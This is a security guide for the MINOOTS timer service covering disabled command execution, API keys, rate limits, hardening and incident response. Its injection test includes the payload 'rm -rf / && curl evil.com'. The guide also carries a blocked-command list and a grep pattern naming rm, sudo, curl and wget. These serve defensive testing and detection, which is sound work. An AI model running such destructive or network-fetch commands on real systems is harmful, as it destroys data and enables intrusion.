# 🔒 MINOOTS Security Guide

## 🚨 Critical Security Notice

**MINOOTS is designed with security-first principles. Please read this entire document before deploying to production.**

---

## ⚠️ Command Execution (DISABLED BY DEFAULT)

### The Issue
The Action Orchestrator can execute system commands, which poses a **critical command injection vulnerability** if user input is not properly sanitized.

### Our Solution
**Command execution is DISABLED by default** for security:

```rust
// Commands are blocked unless explicitly enabled
if std::env::var("MINOOTS_ALLOW_COMMANDS").is_err() {
    return Err(anyhow::anyhow!("Command execution disabled"));
}
```

### If You Must Enable Commands

⚠️ **NOT RECOMMENDED FOR PRODUCTION**

If you absolutely need command execution:

1. **Set environment variable**:
   ```bash
   export MINOOTS_ALLOW_COMMANDS=true
   ```

2. **Commands are whitelisted**:
   Only these commands are allowed:
   - `echo` - Print messages
   - `date` - Show date/time
   - `sleep` - Wait/delay

3. **Dangerous operations blocked**:
   - `rm` (file deletion)
   - `sudo` (privilege escalation)
   - `curl`/`wget` (network requests)
   - `>`, `|`, `;`, `&` (shell operators)

### Secure Alternative: Use Webhooks Instead

Instead of commands, use webhooks to trigger actions in your application:

```json
{
  "actionBundle": {
    "actions": [{
      "type": "webhook",
      "url": "https://your-app.com/timer-action",
      "data": {"action": "cleanup", "resource": "temp-files"}
    }]
  }
}
```

---

## 🔑 Authentication Security

### API Key Format
- All keys must start with `mnt_` prefix
- Keys are validated on every request
- Invalid keys are rejected immediately

### Demo Keys (Development Only)
```
mnt_demo_key_free  # Free tier - development only
mnt_demo_key_pro   # Pro tier - development only
mnt_demo_key_team  # Team tier - development only
```

**🚨 Never use demo keys in production!**

### Rate Limiting
Automatic rate limiting prevents abuse:
- **Free**: 100 requests/minute
- **Pro**: 1,000 requests/minute
- **Team**: 5,000 requests/minute

---

## 🌐 Network Security

### Webhook Validation
- Webhooks use standard HTTP POST
- 30-second timeout prevents hanging
- Failed webhooks are logged but don't crash system
- No automatic retries (prevents abuse)

### Firewall Recommendations
```bash
# Allow only necessary ports
ufw allow 3000/tcp   # Control Plane API
ufw allow 50051/tcp  # Horology Kernel (internal only)
ufw deny 50051/tcp from any to any  # Block external kernel access
```

### Docker Network Isolation
```yaml
# docker-compose.yml includes isolated network
networks:
  default:
    name: minoots-network
    driver: bridge
```

---

## 🛡️ Input Validation

### Timer Duration
- **Minimum**: 1 second
- **Maximum**: 30 days
- **Format**: Validated against regex
- **Invalid inputs**: Rejected with 400 error

### Tenant ID / User ID
- **Length**: Limited to 100 characters
- **Characters**: Alphanumeric + hyphens only
- **SQL Injection**: Not applicable (no SQL database)

### Webhook URLs
- **Protocol**: Must be HTTP or HTTPS
- **Length**: Limited to 2048 characters
- **Format**: Validated as proper URL

---

## 📊 Monitoring & Logging

### Security Events Logged
- Invalid API key attempts
- Rate limit violations
- Command execution attempts
- Webhook failures
- System errors

### Log Format
```
[2024-01-15T10:30:00Z] WARN: Invalid API key: key_invalid_format
[2024-01-15T10:30:01Z] INFO: Rate limit hit: user_123 (100/min exceeded)
[2024-01-15T10:30:02Z] WARN: Command execution disabled: "rm -rf /"
```

### Monitoring Commands
```bash
# Watch security events
docker-compose logs -f | grep -E "(WARN|ERROR|SECURITY)"

# Monitor rate limiting
docker-compose logs -f control-plane | grep "Rate limit"

# Check webhook failures
docker-compose logs -f action-orchestrator | grep "Webhook failed"
```

---

## 🔧 Production Hardening

### 1. Environment Variables
Never put secrets in docker-compose.yml:
```bash
# Use .env file
echo "API_SECRET=your-secret-here" > .env
echo "WEBHOOK_SECRET=another-secret" >> .env
```

### 2. Reverse Proxy
Use nginx to add security headers:
```nginx
server {
    listen 80;
    server_name your-domain.com;

    # Security headers
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";

    location / {
        proxy_pass http://control-plane:3000;
    }
}
```

### 3. Container Security
```dockerfile
# Use non-root user in containers
FROM debian:bookworm-slim
RUN useradd -m -u 1001 minoots
USER minoots
```

### 4. Resource Limits
```yaml
# docker-compose.yml
services:
  control-plane:
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 512M
```

---

## ⚡ Security Testing

### 1. API Key Testing
```bash
# Test invalid keys
curl -H "X-API-Key: invalid" http://localhost:3000/timers
# Expected: 401 Unauthorized

# Test missing keys
curl http://localhost:3000/timers
# Expected: 401 Unauthorized
```

### 2. Rate Limit Testing
```bash
# Spam requests to trigger rate limiting
for i in {1..200}; do
  curl -H "X-API-Key: mnt_demo_key_free" http://localhost:3000/healthz
done
# Expected: 429 Too Many Requests after 100 requests
```

### 3. Command Injection Testing
```bash
# Try to inject commands (should fail)
curl -X POST http://localhost:3000/timers \
  -H "X-API-Key: mnt_demo_key_free" \
  -H "Content-Type: application/json" \
  -d '{
    "tenantId": "test",
    "requestedBy": "attacker",
    "name": "evil-timer",
    "duration": "5s",
    "actionBundle": {
      "actions": [{
        "type": "command",
        "command": "rm -rf / && curl evil.com",
        "data": {}
      }]
    }
  }'
# Expected: Command execution disabled error
```

---

## 🚨 Incident Response

### If You Suspect a Breach

1. **Immediately stop services**:
   ```bash
   docker-compose down
   ```

2. **Check logs for suspicious activity**:
   ```bash
   docker-compose logs > security-incident-$(date +%Y%m%d).log
   grep -E "(rm |sudo |curl |wget |;|&|\|)" security-incident-*.log
   ```

3. **Rotate API keys**:
   ```bash
   # Disable all demo keys and generate new ones
   # Update your applications with new keys
   ```

4. **Update and restart**:
   ```bash
   git pull origin main
   docker-compose build --no-cache
   docker-compose up -d
   ```

---

## ✅ Security Checklist

Before deploying to production:

- [ ] Command execution is disabled (`MINOOTS_ALLOW_COMMANDS` not set)
- [ ] Demo API keys are not used
- [ ] Rate limiting is tested and working
- [ ] Webhook URLs are from trusted sources only
- [ ] Reverse proxy with security headers is configured
- [ ] Container resource limits are set
- [ ] Monitoring and logging are configured
- [ ] Firewall rules block unnecessary ports
- [ ] Security incident response plan is in place

---

## 📞 Reporting Security Issues

If you discover a security vulnerability:

1. **DO NOT** create a public GitHub issue
2. **DO NOT** discuss in public forums
3. **DO** email security concerns to: security@minoots.com
4. **DO** include reproduction steps and impact assessment

We'll respond within 24 hours and coordinate a responsible disclosure.

---

**Security is a shared responsibility. Stay vigilant! 🛡️**